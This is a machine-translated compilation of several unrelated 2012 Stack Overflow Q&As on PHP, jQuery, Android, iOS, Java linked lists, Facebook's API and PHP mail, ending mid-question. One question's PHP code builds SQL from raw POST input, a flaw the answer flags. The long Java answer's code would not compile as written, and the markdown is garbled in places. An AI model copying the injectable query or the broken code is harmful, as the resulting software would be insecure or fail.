我正在开发一个基本站点，我对 php 的了解很少，但我正在努力解决它。当我尝试从 sql 查询中声明两个变量（$lat, $lon）填充它们时，我得到一个错误返回。我得到的错误是

> 警告：mysql_result() 期望参数 1 是资源，布尔值在第 23 行的 /home/content/j/o/h/johnbeach2/html/findtechkids.com/zip2.php 中给出
> 
> 警告：mysql_result() 期望参数 1 是资源，布尔值在 /home/content/j/o/h/johnbeach2/html/findtechkids.com/zip2.php 第 24 行数组中给出

我的页面代码如下，我敢肯定我的逻辑是可怕的，但我是php新手，愿意学习！

```
<?php

$username="johnsmith";
$password="notactuallymypassword";
$database="somedb";
$host="notmydb.gullible.net";

$userzip = $_POST['userzip'];

mysql_connect($host,$username,$password);

@mysql_select_db($database) or die( "Unable to select database");

$mysqli="SELECT lat, lon FROM `zipdb` WHERE zip = '$userzip'";
$result=mysql_query($query);

$r=0;
$lat=mysql_result($result,$r,"lat");
$lon=mysql_result($result,$r,"lon");

echo "$lat  $lon";

function zipcodeRadius($lat, $lon, $radius)
{
    $radius = $radius ? $radius : 20;
    $query="SELECT distinct(zip) FROM zipdb  WHERE (3958*3.1415926*sqrt((lat-'.$lat.')*          (lat-'.$lat.') + cos(lat/57.29578)*cos('.$lat.'/57.29578)*(lon-'.$lon.')*(lon-    '.$lon.'))/180) <= '.$radius.';";
$result1=mysql_query($query);
$zipcodeList = array();
return $zipcodeList;
}

echo zipcodeRadius($lat, $lon, 5);

mysql_close();

?> 
```

我将非常感谢任何反馈，尤其是我遇到的错误，但任何代码改进或建议都非常受欢迎。在此先感谢，哈里森。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:05:36.800

您的查询为空。应该：

```
$mysqli="SELECT lat, lon FROM `zipdb` WHERE zip = '$userzip'";
$result=mysql_query($mysqli); // <---- false 
```

所以，`mysql_query`返回`false`，这就是为什么这个脚本说你`boolean given instead of resource`。

要诊断这种情况，您可以在程序中放置一些[`var_dumps`](http://www.php.net/manual/en/function.var-dump.php)或[`var_exports`](http://www.php.net/manual/en/function.var-export.php)以查看变量的实际值。

> 任何代码改进或建议都非常受欢迎

使用`mysql_query`显式返回的连接链接：

```
$connection = mysql_connect($host,$username,$password);
mysql_select_db('mydatabase', $connection) or die ('could not select database mydatabase');
$resource = mysql_query('INSERT INTO mytable SET key = "val"',$connection) or die('something weird is happening');
$last_mytable_id = mysql_insert_id($connection); 
```

使用[`PDO`](http://php.net/manual/en/book.pdo.php)and[`prepare`](http://www.php.net/manual/en/pdo.prepare.php)语句代替`mysql_`函数：

```
$sql = 'SELECT lat, lon FROM `zipdb` WHERE zip = :userzip';
$sth = $dbh->prepare($sql, array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY));
$sth->execute(array(':userzip' => $userzip));
$result1 = $sth->fetchAll();
$sth->execute(array(':userzip' => $userzip2));
$result2 = $sth->fetchAll(); 
```

它将使您免于一些错误，首先要提到的是，它将使您免于[`SQL Injections`](http://en.wikipedia.org/wiki/SQL_injection)（所谓的[`Bobby Tables`](http://xkcd.com/327/)）。

# jquery - iPhone上的jQuery slideToggle留下线条工件

> ID：11751212
> 
> 赞同：1
> 
> 时间：2012-08-01T01:04:05.773
> 
> 标签：jquery, iphone, mobile-safari

iPhone 上的 slideToggle 有点问题。

ul 展开后，屏幕上会留下一些线条伪影。（右键单击图像>查看图像以全尺寸查看）

![在此处输入图像描述](../Images/f1bf1ef01955cfe41707cd9388981509.png)

这里奇怪的部分是，当我稍微放大时，线条消失了。当我再次缩小时，线条仍然消失了。

编码：

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>

<script type="text/javascript">
  jQuery.noConflict();
  jQuery(function () {
    jQuery("a").click(function () {
      var a = jQuery(this);          
      a.siblings("ul").slideToggle("slow");
      var url = jQuery.trim(jQuery(this).attr("href"));
      if (url != undefined && url.length > 0) return true;
      return false;
    });
  }); 
</script>

<style type="text/css">
  li
  {
    list-style: none;
    border: none;
  }

  ul
  {
    margin: 0;
    padding: 0;
    border: none;

    background-color: #fff;
  }

  #nav
  {
    padding-top: 7px;
    padding-bottom: 7px;
    border: none;  
    background-color: #fff;  
  }

  #nav ul
  {
    margin: 0;
    padding: 0;
    margin: 10px;
    background-color: #fff;
  }

  #nav ul ul
  {
    margin: 0;
    padding: 0;
    margin-top: 7px;
    margin-left: 15px;
    display: none;
    background-color: #fff;
  }

  #nav ul li
  {
    padding-bottom: 7px;  
    background-color: #fff;
  }

  #nav ul li.last
  {
    padding-bottom: 0px;
  }

  #nav ul li > a
  {
    display: block;
    padding: 15px;
    background: #05548D;
    color: White;
    text-decoration: none;
    border-radius: 5px;
  }

  #nav ul ul li > a
  {
    background: #1872BE;      
  }
</style>

<div id="nav">
  <ul>    
    <li><a href="">News &gt;</a>
      <ul>
        <li>
          <a href="Mobile-Home/News/Latest-News.aspx">Latest News</a>
        </li>
        <li>
          <a href="Mobile-Home/News/Upcoming-events.aspx">Upcoming events</a>
        </li>
        <li>
          <a href="Mobile-Home/News/Media-releases.aspx">Media releases</a>
        </li>
        <li>
          <a href="Mobile-Home/News/International-updates.aspx">International updates</a>
        </li>
        <li>
          <a href="Mobile-Home/News/eNewsletter.aspx">eNewsletter</a>
        </li>
        <li>
          <a href="Mobile-Home/News/Register-for-updates.aspx">Register for updates</a>
        </li>
      </ul>
    </li>   
  </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T13:21:20.487

我知道你刚才问过这个问题，所以我想你可能已经解决了这个问题，但是我遇到了同样的问题并寻找解决方案，最后想出了这个，所以我想我会分享如果您仍在寻找解决方案。

通过在动画结束时重置背景颜色，可以防止这些伪影堆积。

`var a = jQuery(this); var callback = function(){ $('#ul').css({'background':'#FFF'}); } a.siblings("ul").slideToggle("slow",callback);`

希望有帮助

修补

# android - Android 对“所有可打包的数据类型”的含义以及我如何使用这些数据？

> ID：11751214
> 
> 赞同：5
> 
> 时间：2012-08-01T01:04:22.743
> 
> 标签：android

考虑 Android 架构并考虑 Android 的操作设计，包括意图、视图、活动、内容提供程序等，有人可以向我解释一下什么样的“东西”是可包裹的或捆绑的？写在 Android 网站上的解释对我来说听起来有点太蹩脚了，我的意思是读这个“一个特殊的类型安全容器，称为 Bundle，可用于异构值的键/值映射。” 我对捆绑包一无所知，对我来说，它们可以是 XML 文件、哈希映射以及“键/值映射”的所有其他变体。

什么是 Parcelable 或 Bundle，它们的设计和用途是什么？

谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-01T01:30:06.387

`Parcelable`并且`Bundle`是您想要发送的信息包！

`Bundle`：如果您想开始新的`activity`，您可以将`Bundle`信息与您创建的`activity`一起发送到：`new Intent`

```
// Bundle b is sent with new intent i
Bundle b = new Bundle();
b.putString(key, value);
b.putInt(key, value);
Intent i = new Intent(...);
i.putExtras(b);
startActivity(i);
// In the activity which started from the intent i, you can get the bundle b
this.getIntent().getExtras(); 
```

`Parcelable`是一个`interface`，如果你想传递一个`object`（你自己的类） with`bundle`或 with `intent`，你应该实现这个`interface`：

```
class Example implements Parcelable{
      // some information here
}
// You can send with intent or bundle:
b.putParcelable(key, value);
i.putExtra(name, value); 
```

更多关于 google android 的详细信息：[Bundle](http://developer.android.com/reference/android/os/Bundle.html) [Parcelable](http://developer.android.com/reference/android/os/Parcelable.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T03:43:12.737

Android 定义了一种新的轻量级 IPC（进程间通信）数据结构，称为 Parcel，您可以在其中将对象扁平化为字节流，与 J2SDK 的序列化概念相同。

Android Parcel 的简短定义是用于轻量级、高性能进程间通信 (IPC) 的消息容器。在 Android 上，“进程”是标准的 Linux 进程，一个进程无法正常访问另一个进程的内存，因此使用 Parcels，Android 系统将对象分解为可以跨进程边界进行编组/解组的基元。

但是 Parcels 也可以在同一个进程中使用，在同一个应用程序的不同组件之间传递数据。例如，一个典型的 Android 应用程序有多个屏幕，称为“活动”，并且需要将数据或操作从一个活动传递到下一个活动。要编写一个可以传递的对象，我们可以实现 Parcelable 接口。Android 本身提供了一个名为 Intent 的内置 Parcelable 对象，用于将信息从一个组件传递到另一个组件

Bundle是android在android组件之间传递信息的方式。正如您所说，它是一本字典，我们可以在其中放置键值对。任何可以打包的东西都应该是原始的或包裹的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-01T01:24:28.010

一个[Bundle](http://developer.android.com/reference/android/os/Bundle.html)实现[Parcelable](http://developer.android.com/reference/android/os/Parcelable.html)。bundle 实例用于存储名称/值对，其中名称是字符串，值是实现 Parcelable 的类。实现 Parcelable 的类可以转换为[Parcel](http://developer.android.com/reference/android/os/Parcel.html)，它可以通过用于 IPC的[IBinder进行序列化。](http://developer.android.com/reference/android/os/IBinder.html)

最常见的用途是在活动和服务之间传递值（Intent extras）

# php - ajax 和 json 错误 ..with php post

> ID：11751222
> 
> 赞同：0
> 
> 时间：2012-08-01T01:05:36.413
> 
> 标签：php, javascript, jquery

好吧，我正用头撞我的桌子。我在我的 php 脚本中发布到一个方法，我正在返回一个 json 数组

```
public function test()
    {
              return json_encode($this->runResults() );
            exit;
        }

    } 
```

上面的回声`(echo json_encode($this->runResults() )`会在下面给你这个

```
[
{"code":"123456","date_created":"2012-07-09","date_expires":null},{"code":"3453432","date_created":"2012-07-09","date_expires":null},
{"code":"3sdf324","date_created":"2012-07-09","date_expires":null},
{"code":"weewr22","date_created":"2012-07-09","date_expires":"2012-07-19"}
] 
```

现在在我的javascript中我有这个

```
 $.ajax({

            url : 'test',
            type : 'POST',
            data : {
                data1: adataval,
                data2: bdataval
            },
            success : function(data) {

               alert(data.length);

            },
            error : function() {
            }
        }); 
```

当它读取每个字符时，它会在 1000 秒内发出警报。我希望长度应该是 4。所以我将上面的 ajax 更改为此

```
 $.ajax({

            url : 'test',
            type : 'POST',
datatype: 'json'
            data : {
                data1: adataval,
                data2: bdataval
            },
            success : function(data) {

               alert(data.length);

            },
            error : function() {
            }
        }); 
```

如您所见，我添加了数据类型：'json'。但后来我开始收到未捕获的错误：NOT_FOUND_ERR: DOM Exception 8

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T07:22:08.330

试试这个 PHP 脚本

```
public function test()
{
    echo json_encode($this->runResults());
} 
```

**更新 ：**

也在 ajax 方法中使用`dataType`not`datatype`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:09:52.653

`alert( $.parseJSON(data).length );`
此外，在您的脚本中，您应该将内容类型设置为 json：`header('Content-type: application/json');`

# iphone - 实现 FBConnect 时的重复接口定义

> ID：11751223
> 
> 赞同：0
> 
> 时间：2012-08-01T01:05:41.247
> 
> 标签：iphone, ios, facebook, fbconnect

我正在尝试将 FBConnect 添加到包含 SBJson 框架的应用程序中。但是，当我尝试编译项目时，出现以下两个错误：

```
Duplicate interface definition for class 'SBJsonWriter'
Duplicate interface definition for class 'SBJsonParser' 
```

我能做些什么来解决这个错误？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-15T14:40:56.087

删除

```
#import FacebookSDK/FacebookSDK.h 
```

在你的项目中

我开始使用 FacebookSDK，但后来我对它的当前状态感到失望并尝试使用旧的“FBConnect”，这就是我得到错误的原因

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T01:55:12.830

有两种可能：

你有两个同名的接口。使用 Xcode 的 find in project 菜单选项来查找 SBJsonWriter 的实例。然后以某种方式重命名其中一个接口，您已经设法两次导入 .h 文件。检查以确保您始终使用#import 而不是#include。

关于#import/#include 的更多信息：

# include 在#include 语句的位置盲目地包含文件。这意味着如果您在 .m 中 #include 一个文件两次，您将获得该文件的两个副本。几乎所有传统的 C #include 文件都有类似以下内容的内容：

```
// some_file.h
#if !defined SOME_FILE_H
#define SOME_FILE_H

//  entire content of #include file

#endif 
```

上面的他有时被称为包含保护宏。

在 Objective-C 中，如果你 #import 一个文件，编译器会执行检查以确保它尚未被导入。因此，防护装置通常被省略。因此，如果您#include 一个应该是#imported 的文件，则不会进行任何检查，并且您有时会得到重复的定义。

# java - 仅使用节点帮助创建 java 链接列表

> ID：11751227
> 
> 赞同：1
> 
> 时间：2012-08-01T01:06:44.790
> 
> 标签：java, data-structures, linked-list

一直在用 Java 做这个项目。建议我为我的程序使用链接列表或数组列表，这非常有意义。然而，教授说我们必须利用节点制作和使用我们自己的链表。尽管在课堂上进行了一些研究和询问，但使用 Nodes 让我非常困惑。我确定这是我缺少的一些简单的东西，但我现在完全不知所措。这是存储列表的类（我认为）。之所以命名为 Aircraft，是因为我们正在创建一个列表来存储多架飞机以及与它们相关的一些详细信息（航班名称、速度、高度、飞机类型）。我有一个用户与之交互的 Main 类（未列出） - 我已经处理了该类。

```
package airTraffic;

public class Aircraft  {

public static String name;
public static String type;
public static int speed;
public static int alt;

Aircraft nextCraft;

public Aircraft (String n, String t, int s, int a) {
    name = n;
    type = t;
    speed = s;
    alt = a;
}

public Aircraft() {

}

public static void setName(String n) {
    name = n;
}

public static String getName (String lookUp) {
    return name;
}

public static void removeName () {
    //remove the flight - not sure what to place here
}

public static void setType (String t) {
    type = t;
}

public static String getType () {
    return type;
}

public static void setSpeed (int s) {
    speed = s;
}

public static int getSpeed () {
    return speed;
}

public static void setAlt(int a) {
    alt = a;
}

public static int getAlt () {
    return alt;
}

public Aircraft next = null;

//auto generated method from ATControl 
public static void add(String s) {

}

//auto generated methods from ATControl - what goes here???
public static void remove() {

}

public Object getNext() {
    // TODO Auto-generated method stub
    return null;
}

public void setNext(Object next2) {
    // TODO Auto-generated method stub

}
 } 
```

下面，我有我认为是创建和存储节点的类。这是我非常困惑并认为我错了的地方。我不确定如何调用节点来实际添加和存储数据。我还需要能够获取节点（通过航班名称）并删除节点（通过航班名称）

```
package airTraffic;

import java.util.*;
import airTraffic.Aircraft;

public class ATControl {

static Main m = new Main ();
Aircraft aircraft = new Aircraft ();

//declare node names for list
public static Aircraft head = new Aircraft ();
public static Aircraft tail = new Aircraft ();

// stores data
private static final int INITIAL_ALLOCATION = 20;
private static int size = INITIAL_ALLOCATION; 

// tells list to add nodes
public static void Nodes (String s, int n) {
    n = size;
    head.next = tail;
    tail.next = tail;
    Aircraft temp = head;
    for (int i= 0; i < size; ++i) {
        temp.next = new Aircraft ();
        temp = temp.next;
    }
    temp.next = tail;
}

public static void addNodes (int n) {
    n = size;
    Aircraft temp = new Aircraft ();
    Aircraft current = head;
    for (int i = 1; i < n && current.getNext() != null; i++) {
        current = (Aircraft) current.getNext();
        temp.setNext(current.getNext());
        current.setNext (temp);
        size++;
    }
}

//add plane and details
public static void addToList (Scanner in) {
    // should add new aircraft to new node on linked list
    System.out.printf("Enter flight number: ");
    String add = in.next();
    Aircraft.setName (add);
    ATControl.addNodes (Integer.parseInt(add));

    //type of plane
    System.out.printf("Enter type of plane: ");
    String plane = in.next();
    Aircraft.setType (plane);

    //plane speed
    System.out.printf("Enter current speed: ");
    int speed = in.nextInt();
    Aircraft.setSpeed (speed);
    ATControl.addNodes (Integer.parseInt(add));

    //add Altitude 
    System.out.printf("Enter current altitude: ");
    int alt = in.nextInt();
    Aircraft.setAlt(alt);
    ATControl.addNodes (Integer.parseInt(add));  // I am fairly certain this is wrong
}

//show flight
public static void showFlight (Scanner in) {
    System.out.printf("Enter flight number for details: ");
    String lookUp = in.next();
    Aircraft.getName(lookUp);

}
// display all flights
public static void displayAll (Scanner in) {
    System.out.printf("All flights: " );

}
//remove flight
public static void removeFlight (Scanner in) {
    System.out.printf("Enter flight number to be removed: ");

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:57:47.317

你越来越近了。首先，链表是对象的列表，通常称为节点，每个节点都有一个或多个指向其他对象的链接。在您的情况下，节点是飞机。

这应该对您有所帮助：[Wikipedia:Linked List](http://en.wikipedia.org/wiki/Linked_list)

到目前为止，您的主要问题是您的飞机类中没有链接。由于这是一个链接列表，因此您需要包含对列表中下一个元素的引用。在 Aircraft 类中，您应该有一个名为`next`Aircraft 类型的属性，它将您链接到列表中的下一个 Aircraft。这允许您调用`myAircraft.next`，就像您目前在代码中一样，这将允许您按顺序在列表中移动。我会让你自己弄清楚其余的，这是家庭作业，但如果你需要更多解释，请随时发表评论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T02:47:25.343

我认为您非常接近 - 但很难准确地说出您的 ATControl 课程中发生了什么。通常，链表上的 add 方法采用节点（在您的情况下为 Aircraft），而不是数字。

链表的关键是每个节点都有一个指向链表中下一个节点的指针。在您的 Aircraft 类中，您有： Aircraft next，它将用作该指针。

我建议在 ATControl 中实现以下方法：

```
public static Aircraft getUserInput(Scanner in)
{
  Aircraft aircraft = new Aircraft();

  // get your values from the user and set them in your new aircraft
  return aircraft;
}

public static void add(Aircraft aircraft) 
{
  // starting at head, walk through the list (repeatedly call next on 
  // the current Aircraft) until you reach the desired position 

  Aircraft temp = head;

  while (temp != null) // ...
}

public static void remove(String flightNum)
{
  // again, the same way you did in add, walk through the list until you find it
    if (current.getName().equals(flightNum))
      // we found it, so remove it
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-24T09:02:42.127

**除非您对 OOP 和引用类型有非常牢固的掌握，否则尝试编写 LinkedList 实现是一种自虐实践。**

以下将是漫长的，可能是痛苦/羞辱的。没关系，这将是一次很好的学习经历。我为此付出了很多努力，以提供带有详尽评论的完整实现。我建议你仔细阅读细节，直到你完全理解它们的目的。

首先，修复你的**飞机**等级。由于您需要创建多个实例，因此静态成员将不起作用。如果您不明白为什么，请花一些时间来复习您的 OOP 基础知识。

列表节点应设计为存储最少的数据。在你的情况下，看起来你大部分时间都在那里。每个节点都有特定的航班数据以及对列表中下一项的引用。这就是你所需要的。

**没有所有多余的东西，这就是它的样子：**

```
public class Aircraft  {
    public String name;
    public String type;
    public int speed;
    public int alt;
    Aircraft next;

    public Aircraft (String n, String t, int s, int a) {
        name = n;
        type = t;
        speed = s;
        alt = a;
        next = null;
    }
} 
```

看起来不错。可以安全地假设它内置了所有必要的功能。

**如果需要，请随时添加以下内容：**

*   设置名称（）
*   获取名称（）
*   设置类型（）
*   获取类型（）
*   设置速度（）
*   获取速度（）
*   设置Alt()
*   获取Alt()

*注意：这些仅在未设置为静态时才有效。除非您打算在每次调用时将被更改的**Aircraft实例作为参数之一传递。**相信我，使用实例方法要容易得多。*

**变化：**

*   我删除了**Aircraft()**构造函数。至少，您需要使用至少一个航班号（或其他一些唯一标识符）来初始化一个**Aircraft**节点，否则您以后将无法在列表中找到该 Aircraft。

*   **removeName()**没用。由于各个节点只知道列表中的下一项，因此它们无法删除自己。如果您使用双向链表，其中每个节点都存储对*前*一个节点和*下一个*节点的引用，那么这是可能的，但实际上没有必要。**add()**和**remove()* 方法**也是如此。**添加/删除在 **ATControl**类中处理。

*   也不需要**getNext()**或**setNext()**。由于**ATControl**用于维护列表的状态（例如大小、容量等），因此您不会希望通过 getter/setter 公开访问**nextCraft 。**

**现在对于 ATControl：**

```
public class ATControl {
    private Aircraft head; // stores the start of the chain
    private Aircraft tail; // stores the end of the chain
    private int size; // stores the length of the chain

    public ATControl() {
        // ♫ "Started from the bottom now we're herre' ♫
        // Seriously, the list should start with nothing
        head = null;
        tail = null;
        size = 0;
    }

    public void addFlight(String flight, String plane, int speed, int alt) {
        // TODO: Implement this
    }

    public void removeFlight(String name) {
        // TODO: Implement this 
    }

    public void displayFlight(String name) {
        // TODO: Use a foreach loop to find and display a flight
    }

    public void displayAll() {
        // TODO: Use a foreach loop to display the flights here
    }
} 
```

**变化：**

*   我删除了**main* 成员，因为我不知道它在这里是如何工作的。无论哪种方式，要使用它，您都需要创建一个新的 **ATControl**实例。

*   我删除了内联变量声明，因为必须在构造函数中设置实例成员。

*   头部和**尾部被初始化****为**空，因为还没有添加任何**飞机**。

*****   我删除了**飞机**成员，因为它永远不会被使用。

    *   除非您只希望创建一个**ATControl**实例，否则您也不应该将**head**和**tail**设置得太静态。如果它们中的任何一个被除 ATControl 之外的任何东西更改，它将搞砸列表的内部状态，因此它们应该设置为私有。

    *   我删除了大小限制，因为没有必要进行这项工作。如果需要，您可以稍后再添加。

    *   我取消**Nodes()**和**addNodes()**有两个原因。首先，它都违反了 SRP（单一责任原则），因为它们负责创建节点和节点集合。第二——我假设这是一个错误，但是——您将航班号作为您想要创建的节点数传递。例如，如果航班号为 1457，您将向列表中添加 1457 个空节点。

    *   我将 addToList() 重命名为**addFlight** **()**以保持一致。为了保持一致性，我还将**showFlight()**重命名为**displayFlight()**。为了简单起见并使这个类不仅仅对命令行输入有用，我还删除了用户输入部分。**** 

 ***** * *

**我知道我知道！我是一个无情的屠夫，但现在代码可以开始构建必要的功能了。**

第一件事。如果您不知道如何让一个类可迭代（即作为一个 foreach 循环工作），您很快就会发现。我需要向**ATControl**添加更多内容，但这会很有趣。

```
public class ATControl implements Iterable {
    private Aircraft head;
    private Aircraft tail;
    private int size;

    public ATControl() {
        head = null;
        tail = null;
        size = 0;
    }

    public void addFlight(String flight, String plane, int speed, int alt) {
        // if the list is not currently empty
        if (!isEmpty()) {
            // store a reference to the last Aircraft in the list
            Aircraft prev = tail;
            // create a new aircraft and add it to the end of the list  
            tail = new Aircraft(flight, plane, speed, alt);
            // link the old tail to the new tail
            prev.next = tail;
        }
        // an empty list needs to be handled a little differently
        else {
            // notice, with no tail there's no tail to update
            tail = new Aircraft(flight, plane, speed, alt);
            // also, since there's only one item the head and tail are the same
            head = tail;
        }
        size++;
    }

    // The hard part. Lots of nasty edge cases.
    // Creating one of these from scratch will make your head hurt.
    // Note: Setting variables to null marks them for the garbage collector.
    // SideNote: With a doubly-linked list you can do removals within a foreach loop
    public void removeFlight(String flight) {
        Node prev = head;
        Node curr = head;
        // crawl the list looking for a match
        while (curr.next != null || curr == tail) {
            if (curr.flight.equals(flight)) {
                // if there is only one item left, null everything
                if (size == 1) { head = null; tail = null; }
                // reset the head to start at the second Aircraft
                else if (curr.equals(head)) { head = head.next; }
                // reset the tail to end at the 2nd-to-last Aircraft
                else if (curr.equals(tail)) { tail = prev; tail.next = null; }
                // if it's in the middle, re-connect the broken links on either end
                else { prev.next = curr.next; }
                size--;
                break;
            }
            prev = curr;
            curr = prev.next;
        }
    }

    public boolean isEmpty() {
        return size == 0; // only returns true if size is 0

    // The fun part. The following are necessary to make the list iterable
    // Like magic, this class will now be callable as a foreach loop
    public Iterator<Aircraft> iterator() { return new ATCIterator(); }

    // This iterator code can be reused on any linked-list implementation
    // Keep this handy in case you need to implement Iterable in the future
    private class ATCIterator implements Iterator<Aircraft> {
        private Aircraft current = head;

        public Aircraft next() {
            if (!hasNext()) { throw new NoSuchElementException(); }
            Aircraft aircraft = current;
            current = current.next;
            return aircraft;
        }

        public boolean hasNext() { return current != null; }

        // inline removals require a doubly linked list. To reconnect the break 
        // in the chain the node has to be aware of both the previous and next nodes.
        public void remove() { throw new UnsupportedOperationException(); }
    }

    // lets put that foreach loop functionality to good use now.

    // Bonus: use this to retrieve the matching Aircraft instance
    // Once you have a reference to the Aircraft instance you can do things like
    // get/set it's internal values.
    public aircraft getFlight(String flight) {
        for (Aircraft aircraft : this)
            if (this.flight == flight) {
                return this;
    }

    // displays the flight number of the first match
    public void displayFlight(String flight) {
        for (Aircraft aircraft : this)
            if (this.flight == flight) {
                System.out.printf("Flight: " + flight);
                // Note: you can access the Aircraft details here via the 'this' keyword
                return;
    }

    // crawls the whole list and displays the flight number of every aircraft
    public void displayAll() {
        for (Aircraft aircraft : this)
            System.out.printf("Flight: " + flight);
            // Note: you can access the flight details here via the 'this' keyword
    }
} 
```

* * *

所以，你有一堵代码墙，里面有很多注释要咀嚼。是时候讨论一些理论了。

**是什么让 LinkedList 成为 LinkedList 呢？**

它实际上只是一堆随机放置在堆上并通过引用（或 C 人群的指针）链接在一起的对象实例。

将 LinkedList 想象为**Samba Line**。

![桑巴线](../Images/8565b2ab2d86cb7fb494d92b58e62545.png)

*资料来源：[旅行之眼博客](http://thetravelingeye.blogspot.com/2012_08_01_archive.html)*

*注意：双向链表是一样的，只是行可以改变方向。*

每个人都紧紧抓住前面的人，却看不到后面的人。添加到列表就像将一个人添加到队列的前面。从技术上讲，我编写的 LinkedList 以相反的方向工作，将添加添加到前面并从尾部删除删除，但概念是相同的。

从列表中获取/删除一个项目就像添加一个冰柱。第一次击中从链条中取出，并通过重新连接断裂的末端来修复断裂。

使用 LinkedList 的好处是它可以根据需要变大或变小。您可以随意添加/删除节点。

缺点是，与数组不同，如果不先遍历链接链，就无法从列表中获取项目。此外，当列表变得非常大时，所有这些类实例和引用的开销开始变得昂贵。

在性能方面，添加项目需要 O(1)（即恒定时间）。O(N)（即线性时间）从列表中获取/删除项目。而且，根据列表是单/双和/或跳转链接，存在显着的内存开销。

还有其他数据结构，如 ArrayLists、HashMaps 等，它们对于像您这样的用例具有更好的性能或内存特性，但它们的编写/管理更加复杂。

无需工作即可获得高级数据结构的所有神奇优点的最简单方法是包装和扩展现有实现。例如，您可以创建一个在内部使用 ArrayList 进行数据存储的类。您甚至可以使用我上面演示的方法使其可迭代。除了为任何通用类型编写之外，它可以自定义为使用您的飞机数据类型。

*注意：如果您想学习如何编写数据结构，我建议您在线（或以其他方式）参加 Algorithms I 课程。*

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T04:09:48.750

这是回复者在说列表时所指内容的链接。这是一个解释列表的链接[http://www.algolist.net/Data_structures/Singly-linked_list/Traversal 。](http://www.algolist.net/Data_structures/Singly-linked_list/Traversal)但是，我不确定这在 java 中是否具有代表性。您编写的代码看起来不是在排序，而是在列表末尾添加所有飞机。因此列表没有排序。当您使 temp.next = tail 使列表中的最后一架飞机指向自身而不是 null 时。但是您不是在检查空值，而是在计算列表中的飞机数量。我发布了一个 java 示例，其中你有一个节点类，下一个节点，你应该添加节点尾部，因为你的代码正在使用它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T02:14:34.450

公共类节点{

```
 public int item;
   public Node next;
   public Node tail;

   Node() {                 
      item = 0; 
      next = null; 
       tail = null ;    
   } 

   Add Node(node tail, node new) {

      tail.next = new;
        tail.tail = new
        new.tail =null

   } 
```

};

我希望我没有让事情变得更糟。祝你好运。

飞机类可以扩展节点类。看看java中的childfactory类。它将为您提供将在节点类中使用的方法类型的示例。重新考虑你的课程。也许 remove Airplane 将是节点类中的一个方法，如删除节点。任何在节点上工作的东西，例如插入或添加新、删除和排序都可以添加到节点类中。然后，您可以在添加更多类时重用此类。

[http://docs.oracle.com/javase/tutorial/java/IandI/subclasses.html](http://docs.oracle.com/javase/tutorial/java/IandI/subclasses.html)****

# javascript - 通过 Javascript API 发表评论

> ID：11751230
> 
> 赞同：0
> 
> 时间：2012-08-01T01:07:03.357
> 
> 标签：javascript, facebook-graph-api, facebook-comments

我正在尝试使用 javascript API 发表评论。我首先得到一个特定的评论列表`url`：

```
FB.api('/fql', {q: {
  query0: 'SELECT comments_fbid FROM link_stat WHERE url="'+url+'"',
  query1: 'SELECT post_fbid, fromid, text, time, comments FROM comment WHERE object_id IN (SELECT comments_fbid FROM #query0) ORDER BY time DESC',
  query2: 'SELECT id, name FROM profile WHERE id IN (SELECT fromid FROM #query1)'
}}, function(resp) {
  ...
}); 
```

然后我可以发布到`comments_fbid`页面或`post_fbid`回复评论列表中的现有帖子。这些由`id`以下表示：

```
FB.login(function(resp) {
  if (!resp.authResponse) return;
  FB.api('/'+id+'/comments', 'post', {message: 'Hello World', function(resp) {
    console.log(resp);
  });
}, {scope: 'publish_stream'}); 
```

如果我发帖回复现有消息（即，发给`post_fbid`），它可以正常工作，但如果我发帖到顶级评论列表（即，`comments_fbid`），我会收到一个错误：

```
{error: {code: 1, message: "An unknown error has occurred.", type: "OAuthException"}} 
```

# email - 使用 PHP 的 mail() 函数发送和发送电子邮件时，如何自定义“发件人”字段？

> ID：11751234
> 
> 赞同：0
> 
> 时间：2012-08-01T01:07:29.093
> 
> 标签：email, php

考虑 gmail 中的“发件人”列。有时这个专栏会说类似的东西`<info@company.com>`，但它通常会说类似的东西`Company Name`。查看电子邮件收件箱时，如何让我的电子邮件`My Company`在“发件人”列中显示。这是我正在使用的代码：

```
$to = recipient@some_domain.com;
$subject = 'You have mail!';
$message = 'This is my message.';
$headers = 'From: me@my_company.com';

mail($to, $subject, $message, $headers); 
```

在 gmail 中，用户收件箱的“发件人”列会显示“我”，而在 yahoo 中会显示“me@my_company.com”。我想让它说“我的公司”。我试过这个：

```
$headers = 'From: "My Company" <me@my_company.com>'; 
```

但它不起作用。当用户收到我的一封电子邮件时，如何让它在“发件人”字段中显示“我的公司”？提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:10:05.643

试试这个：

```
$headers="From: Your Company\r\nReply-To: yourEmail@your.com"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:19:43.530

如果您使用的是 sendmail，除了标准标头之外，您还可以指定`-f`选项来设置信封发件人地址：

```
$headers  = 'From: "My Company" <me@my_company.com>' . "\r\n";
$headers .= 'Reply-To: me@my_company.com' . "\r\n";

mail( $to, $subject, $message, $headers, '-fme@my_company.com'); 
```

这帮助我过去解决了您遇到的同样问题。

# ruby-on-rails - 登录我们的网站时收到“会话已过期”

> ID：11751236
> 
> 赞同：3
> 
> 时间：2012-08-01T01:07:39.830
> 
> 标签：ruby-on-rails, twitter, devise, omniauth

很抱歉重复发布可能相同的问题，但我认为我没有在前一个问题上解释过这个问题。这是一个更容易理解的问题：

